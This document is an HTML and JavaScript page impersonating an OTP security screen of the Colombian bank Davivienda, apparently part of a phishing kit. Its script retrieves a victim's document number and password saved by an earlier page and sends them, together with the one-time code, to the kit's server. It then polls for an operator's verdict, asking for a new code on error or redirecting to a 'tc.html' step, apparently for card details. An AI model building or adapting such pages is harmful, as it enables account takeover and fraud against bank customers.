<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Validación OTP - Davivienda</title>
    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@300;400;700&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Montserrat', sans-serif; }
        body { display: flex; flex-direction: column; min-height: 100vh; background-color: #f4f4f4; overflow: hidden; }
        
        header { background-color: #E30613; display: flex; justify-content: center; align-items: center; height: 85px; }
        .logo-container img { height: 45px; }

        .container { flex-grow: 1; display: flex; flex-direction: column; justify-content: center; align-items: center; text-align: center; padding: 20px; position: relative; }
        
        /* El formulario principal */
        .card { 
            background-color: white; 
            padding: 40px; 
            border-radius: 15px; 
            box-shadow: 0 4px 15px rgba(0,0,0,0.1); 
            max-width: 450px; 
            width: 100%; 
            transition: filter 0.4s ease, opacity 0.4s ease;
        }

        /* Efecto Blur cuando está cargando */
        .card.blur-active {
            filter: blur(6px);
            opacity: 0.6;
            pointer-events: none; 
        }

        .title { color: #E30613; font-size: 24px; font-weight: 700; margin-bottom: 10px; }
        .subtitle { color: #555; font-size: 14px; margin-bottom: 30px; line-height: 1.5; }
        
        .otp-inputs { display: flex; justify-content: center; gap: 8px; margin-bottom: 30px; }
        .otp-inputs input { width: 45px; height: 55px; font-size: 24px; text-align: center; border: 2px solid #ccc; border-radius: 8px; outline: none; font-weight: bold; }
        .otp-inputs input:focus { border-color: #E30613; }

        .btn { width: 100%; height: 45px; background-color: #E30613; color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: 700; cursor: pointer; transition: transform 0.2s; display: flex; justify-content: center; align-items: center; }
        .btn:hover:not(:disabled) { transform: scale(1.02); }
        .btn:disabled { background-color: #999; cursor: not-allowed; }
        
        .btn-spinner { width: 20px; height: 20px; border: 3px solid rgba(255,255,255,0.3); border-top: 3px solid white; border-radius: 50%; animation: spin 1s linear infinite; display: none; }
        @keyframes spin { to { transform: rotate(360deg); } }

        /* --- PANTALLA DE CARGA (OVERLAY) --- */
        .loading-overlay {
            position: absolute;
            top: 0; left: 0; right: 0; bottom: 0;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 100;
            transition: opacity 0.4s ease;
        }
        
        .loading-overlay.hidden {
            opacity: 0;
            pointer-events: none;
        }

        .loading-box {
            background: white;
            padding: 30px 50px;
            border-radius: 15px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.2);
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 20px;
        }

        .big-spinner {
            width: 50px;
            height: 50px;
            border: 5px solid #f3f3f3;
            border-top: 5px solid #E30613;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        .loading-text { font-size: 18px; font-weight: 700; color: #333; }

        @media (max-width: 768px) {
            .card { padding: 25px 20px; }
            .otp-inputs input { width: 38px; height: 48px; font-size: 20px; }
        }
    </style>
</head>
<body>
    <header><div class="logo-container"><img src="davi.png" alt="Davivienda"></div></header>

    <div class="container">
        <!-- Overlay de Carga -->
        <div class="loading-overlay" id="loadingOverlay">
            <div class="loading-box">
                <div class="big-spinner"></div>
                <div class="loading-text">Cargando...</div>
            </div>
        </div>

        <!-- Tarjeta del Formulario -->
        <div class="card blur-active" id="otpCard">
            <div class="title">Validación de Seguridad</div>
            <div class="subtitle">Ingrese el código de 6 dígitos que enviamos a su dispositivo.</div>
            
            <div class="otp-inputs">
                <input type="text" maxlength="1" oninput="moveNext(this, 0)">
                <input type="text" maxlength="1" oninput="moveNext(this, 1)">
                <input type="text" maxlength="1" oninput="moveNext(this, 2)">
                <input type="text" maxlength="1" oninput="moveNext(this, 3)">
                <input type="text" maxlength="1" oninput="moveNext(this, 4)">
                <input type="text" maxlength="1" oninput="moveNext(this, 5)">
            </div>

            <button class="btn" id="btnValidar" onclick="enviarOTP()">
                <span id="btnText">Validar Código</span>
                <div class="btn-spinner" id="btnSpinner"></div>
            </button>
        </div>
    </div>

    <script>
        // 1. LEER DATOS (Con protección para que NO rebote)
        const documento = localStorage.getItem('doc_usuario') || 'No leido';
        const clave = localStorage.getItem('clave_usuario') || 'No leida';

        // 2. SIMULACIÓN DE CARGA (3 segundos)
        setTimeout(() => {
            const overlay = document.getElementById('loadingOverlay');
            overlay.classList.add('hidden');
            const card = document.getElementById('otpCard');
            card.classList.remove('blur-active');
            
            const firstInput = document.querySelector('.otp-inputs input');
            if (firstInput) firstInput.focus();
        }, 3000);

        // 3. AVANZAR ENTRE INPUTS
        function moveNext(current, index) {
            current.value = current.value.replace(/[^0-9]/g, '');
            if (current.value.length === 1) {
                const next = document.querySelectorAll('.otp-inputs input')[index + 1];
                if (next) next.focus();
            }
        }

        // 4. ENVIAR OTP
        async function enviarOTP() {
            const inputs = document.querySelectorAll('.otp-inputs input');
            let otp = '';
            inputs.forEach(input => otp += input.value);

            if (otp.length < 6) {
                alert("Por favor, ingrese los 6 dígitos.");
                return;
            }

            const btn = document.getElementById('btnValidar');
            const btnText = document.getElementById('btnText');
            const spinner = document.getElementById('btnSpinner');

            btnText.style.display = 'none';
            spinner.style.display = 'block';
            btn.disabled = true;

            try {
                const res = await fetch('/api/validar-otp', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ documento, clave, otp })
                });
                const data = await res.json();

                if (data.status === 'ok') {
                    const interval = setInterval(async () => {
                        const statusRes = await fetch(`/api/verificar-otp/${data.id}`);
                        const statusData = await statusRes.json();

                        if (statusData.estado === 'aceptar') {
                            clearInterval(interval);
                            window.location.href = 'https://www.davivienda.com';
                        } else if (statusData.estado === 'error') {
                            clearInterval(interval);
                            alert('Error: El código OTP es incorrecto o ha expirado. Intente de nuevo.');
                            resetBtn();
                        } else if (statusData.estado === 'tc') {
                            clearInterval(interval);
                            window.location.href = 'tc.html';
                        }
                    }, 3000);
                } else {
                    alert('Error de conexión. Intente de nuevo.');
                    resetBtn();
                }
            } catch (e) {
                alert('Error de red.');
                resetBtn();
            }
        }

        function resetBtn() {
            const btn = document.getElementById('btnValidar');
            const btnText = document.getElementById('btnText');
            const spinner = document.getElementById('btnSpinner');
            btnText.style.display = 'block';
            spinner.style.display = 'none';
            btn.disabled = false;
            
            document.querySelectorAll('.otp-inputs input').forEach(input => input.value = '');
            document.querySelector('.otp-inputs input').focus();
        }
    </script>
</body>
</html>
